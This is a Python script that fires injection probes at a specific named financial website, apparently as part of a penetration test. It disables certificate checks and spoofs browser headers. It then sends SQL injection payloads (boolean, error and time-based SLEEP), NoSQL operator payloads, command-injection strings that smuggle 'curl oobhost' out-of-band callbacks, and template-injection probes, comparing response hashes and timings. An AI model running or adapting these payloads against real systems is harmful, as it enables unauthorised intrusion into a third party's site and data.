import urllib.request, urllib.parse, hashlib, time, ssl, sys
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
H={'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'Accept-Language':'en-US,en;q=0.9','Accept-Encoding':'identity','Upgrade-Insecure-Requests':'1',
'Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1',
'sec-ch-ua':'Chromium','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'macOS'}

def get(u, hdrs=None):
    h=dict(H); h.update(hdrs or {})
    try:
        r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=30,context=ctx)
        b=r.read(); return r.status,len(b),b
    except urllib.error.HTTPError as e:
        b=e.read(); return e.code,len(b),b
    except Exception as e: return 'ERR',0,str(e).encode()

def norm(b):
    """strip the volatile parts of the vercel interstitial so we compare only real content"""
    import re
    s=b.decode('utf-8','ignore')
    s=re.sub(r'[0-9a-fA-F]{8,}','',s)
    s=re.sub(r'\d{4,}','',s)
    return hashlib.md5(s.encode()).hexdigest()

B='https://www.infinitycapital.bh/'
def test(label, qs, hdrs=None, pause=2.0):
    rows=[]
    for lab,q in qs:
        t0=time.time(); st,ln,b=get(B+q, hdrs); dt=time.time()-t0
        rows.append((lab,q,st,ln,norm(b),dt))
        print("%-14s %-46s -> %s len=%s norm=%s t=%.2f" % (lab,q,st,ln,norm(b)[:12],dt))
        time.sleep(pause)
    return rows

if __name__=='__main__':
    which=sys.argv[1]
    if which=='sql':
        test('SQLi/$v',[
          ('BASE','?%24v=1'),
          ('BASE2','?%24v=1'),
          ('OR-TRUE','?%24v=1%27%20OR%20%271%27%3D%271'),
          ('OR-FALSE','?%24v=1%27%20OR%20%271%27%3D%272'),
          ('AND-T','?%24v=1%27%20AND%20%271%27%3D%271--%20-'),
          ('AND-F','?%24v=1%27%20AND%20%271%27%3D%272--%20-'),
          ('ERR','?%24v=1%27'),
          ('SLEEP','?%24v=1%27%20AND%20SLEEP(6)--%20-'),
          ('BASE3','?%24v=1'),
          ('MARK','?%24v=ICVAPT915'),
        ])
    elif which=='nosql':
        test('NoSQLi/$v',[
          ('BASE','?%24v=1'),
          ('NE','?%24v[$ne]=1'),
          ('GT','?%24v[$gt]=1'),
          ('REGEX','?%24v[$regex]=.*'),
          ('EXISTS','?%24v[$exists]=true'),
          ('JSONNE',''),
          ('BASE2','?%24v=1'),
        ],hdrs={'Accept':'application/json'})
    elif which=='cmdi':
        test('CMDi/$v',[
          ('BASE','?%24v=1'),
          ('SEMI','?%24v=1%3Bcurl%20oobhost'),
          ('BSUB','?%24v=1%60curl%20oobhost%60'),
          ('PIPE','?%24v=1%7Ccurl%20oobhost'),
          ('NL','?%24v=1%0acurl%20oobhost'),
          ('BASE2','?%24v=1'),
        ])
    elif which=='ssti':
        test('SSTI/$v',[
          ('BASE','?%24v=1'),
          ('MATH7','?%24v=%7B%7B7*7%7D%7D'),
          ('MATH2','?%24v=%24%7B7*7%7D'),
          ('JINJA','?%24v=%7B%25+7*7+%25%7D'),
          ('EL','?%24v=%24%7B7*7%7D'),
          ('FREEMARK','?%24v=%3C%23assign%20x%3D7*7%3E%24%7Bx%7D'),
          ('MARK','?%24v=ICVAPT915X'),
          ('BASE2','?%24v=1'),
        ])
